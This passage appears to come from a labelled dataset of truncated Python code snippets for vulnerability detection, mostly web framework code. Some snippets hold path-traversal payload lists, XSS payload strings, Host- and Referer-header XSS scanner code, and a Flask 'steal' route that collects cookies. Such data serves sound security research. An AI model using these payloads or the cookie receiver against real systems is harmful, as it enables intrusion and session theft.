\texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue", "label": 0}, {"snippet_id": 17181, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns ", "label": 0}, {"snippet_id": 44141, "code": "=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits", "label": 1}, {"snippet_id": 20543, "code": "-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=(", "label": 0}, {"snippet_id": 16844, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 10447, "code": "'t duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop)", "label": 0}, {"snippet_id": 45901, "code": ".core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop.lib.exceptions_renderable import PopupException from desktop", "label": 0}, {"snippet_id": 52396, "code": "]=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc", "label": 0}, {"snippet_id": 16213, "code": ".password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>", "label": 0}, {"snippet_id": 31010, "code": "\tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) ", "label": 0}, {"snippet_id": 33535, "code": "\t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self", "label": 0}, {"snippet_id": 39916, "code": ".get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t ", "label": 0}, {"snippet_id": 9132, "code": "]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name", "label": 1}, {"snippet_id": 20061, "code": " work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot", "label": 0}, {"snippet_id": 31952, "code": "\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting(", "label": 0}, {"snippet_id": 7266, "code": "\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx", "label": 0}, {"snippet_id": 46218, "code": ".mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user)", "label": 0}, {"snippet_id": 24467, "code": ", DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env", "label": 1}, {"snippet_id": 4161, "code": " xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 31778, "code": "\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue", "label": 0}, {"snippet_id": 44772, "code": " node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get", "label": 0}, {"snippet_id": 54147, "code": "): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label", "label": 0}, {"snippet_id": 1525, "code": " scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api", "label": 0}, {"snippet_id": 52075, "code": ") }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id", "label": 1}, {"snippet_id": 21822, "code": "'django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):", "label": 0}, {"snippet_id": 49197, "code": ": c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self", "label": 0}, {"snippet_id": 49508, "code": ".query_params) for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat", "label": 0}, {"snippet_id": 17317, "code": "(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/", "label": 0}, {"snippet_id": 12110, "code": " 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 15067, "code": " def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite", "label": 0}, {"snippet_id": 1796, "code": " api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line:", "label": 0}, {"snippet_id": 16872, "code": "'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name", "label": 0}, {"snippet_id": 31625, "code": "='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title", "label": 0}, {"snippet_id": 26748, "code": "%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../..", "label": 0}, {"snippet_id": 27180, "code": ".append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action =re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>", "label": 1}, {"snippet_id": 32761, "code": " for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ", "label": 0}, {"snippet_id": 7364, "code": " +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 47238, "code": "'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid)", "label": 1}, {"snippet_id": 48906, "code": ".smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column", "label": 1}, {"snippet_id": 51741, "code": " 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname", "label": 0}, {"snippet_id": 13569, "code": ".module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$',", "label": 0}, {"snippet_id": 20546, "code": "' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 3237, "code": " for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers)", "label": 0}, {"snippet_id": 53573, "code": "('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json", "label": 0}, {"snippet_id": 50091, "code": "[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self", "label": 0}, {"snippet_id": 16899, "code": "]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress", "label": 0}, {"snippet_id": 34499, "code": "\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0", "label": 0}, {"snippet_id": 24057, "code": " various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\"", "label": 0}, {"snippet_id": 9530, "code": ".remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 12833, "code": "'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if", "label": 0}, {"snippet_id": 8224, "code": "', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name=", "label": 0}, {"snippet_id": 40719, "code": " high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not", "label": 0}, {"snippet_id": 45488, "code": " properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(", "label": 0}, {"snippet_id": 7419, "code": "+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to'", "label": 0}, {"snippet_id": 3954, "code": "!=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11", "label": 0}, {"snippet_id": 3653, "code": ",method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid)", "label": 0}, {"snippet_id": 53310, "code": "(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return", "label": 0}, {"snippet_id": 9627, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views", "label": 0}, {"snippet_id": 26824, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader", "label": 0}, {"snippet_id": 1239, "code": " scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed", "label": 0}, {"snippet_id": 43110, "code": " self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field", "label": 0}, {"snippet_id": 30007, "code": "): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry", "label": 0}, {"snippet_id": 21364, "code": "[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "label": 1}, {"snippet_id": 20139, "code": " self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\")", "label": 0}, {"snippet_id": 47724, "code": " return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason))", "label": 0}, {"snippet_id": 50843, "code": " else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs): kwargs[\"options\"].update", "label": 0}, {"snippet_id": 53969, "code": "\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request", "label": 0}, {"snippet_id": 8130, "code": "]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/'", "label": 0}, {"snippet_id": 53722, "code": "=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config(application_name, default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__'", "label": 0}, {"snippet_id": 6593, "code": " value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res return res @property def verify_request_signatures(self): \"\"\" Verify", "label": 0}, {"snippet_id": 17965, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==", "label": 0}, {"snippet_id": 47285, "code": "'invenio_records.models.RecordMetadata') as db_mock: db_mock.side_effect=SQLAlchemyError() res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 res=client", "label": 0}, {"snippet_id": 5710, "code": "()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert", "label": 0}, {"snippet_id": 3276, "code": "\"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text", "label": 0}, {"snippet_id": 40758, "code": " \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor", "label": 0}, {"snippet_id": 28745, "code": "=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit", "label": 1}, {"snippet_id": 2625, "code": " host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s", "label": 0}, {"snippet_id": 50314, "code": ", False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self", "label": 0}, {"snippet_id": 14647, "code": "=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite", "label": 0}, {"snippet_id": 44005, "code": "\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters", "label": 0}, {"snippet_id": 20221, "code": " into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common", "label": 0}, {"snippet_id": 38459, "code": " from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe", "label": 0}, {"snippet_id": 13252, "code": "), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware", "label": 0}, {"snippet_id": 34528, "code": " a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key", "label": 0}, {"snippet_id": 44580, "code": "(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type", "label": 0}, {"snippet_id": 6293, "code": " to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen", "label": 0}, {"snippet_id": 52611, "code": "('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in", "label": 0}, {"snippet_id": 28162, "code": ".get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: ", "label": 0}, {"snippet_id": 53773, "code": " pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http:", "label": 1}, {"snippet_id": 39658, "code": "\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t", "label": 0}, {"snippet_id": 38687, "code": ".dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif", "label": 0}, {"snippet_id": 36544, "code": "\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t", "label": 0}, {"snippet_id": 40429, "code": "\tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param", "label": 0}, {"snippet_id": 42139, "code": "]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname", "label": 0}, {"snippet_id": 50322, "code": ".start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive.", "label": 0}, {"snippet_id": 47801, "code": " return HttpResponseForbidden() try: if request.GET.get(\"user_id\"): pid=int(request.GET[\"user_id\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes", "label": 0}, {"snippet_id": 2612, "code": "(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss", "label": 0}, {"snippet_id": 26713, "code": " '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 35563, "code": ".in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t", "label": 0}, {"snippet_id": 31185, "code": " form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport http.cookies \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate", "label": 0}, {"snippet_id": 6156, "code": "']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}", "label": 0}, {"snippet_id": 42017, "code": " \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key", "label": 0}, {"snippet_id": 40766, "code": "\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)", "label": 0}, {"snippet_id": 13277, "code": "'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 41983, "code": " BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: ", "label": 0}, {"snippet_id": 54661, "code": "'article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments']=self.object.comment_set.all().order_by('-time') context", "label": 0}, {"snippet_id": 55070, "code": ".errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({", "label": 1}, {"snippet_id": 50910, "code": " Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin", "label": 0}, {"snippet_id": 43057, "code": "\t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options", "label": 0}, {"snippet_id": 4312, "code": "/script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js):", "label": 1}, {"snippet_id": 26248, "code": ".instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id", "label": 0}, {"snippet_id": 19635, "code": ", suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file", "label": 0}, {"snippet_id": 18968, "code": "(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 32674, "code": " output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md", "label": 0}, {"snippet_id": 17130, "code": " name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(", "label": 0}, {"snippet_id": 28538, "code": ") +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: \" +serv +\"\\n\" \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint", "label": 0}, {"snippet_id": 44065, "code": ".doc_types=doc_types self._model=model if fields: self.fields=fields super(RTDFacetedSearch, self).__init__(**kwargs) class ProjectSearch(RTDFacetedSearch): fields=['name^5', 'description'] facets={ 'language'", "label": 0}, {"snippet_id": 53465, "code": " dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user", "label": 0}, {"snippet_id": 49254, "code": " object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model=model self.field_name=field self.label=label self.render_function", "label": 0}, {"snippet_id": 5885, "code": "-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % 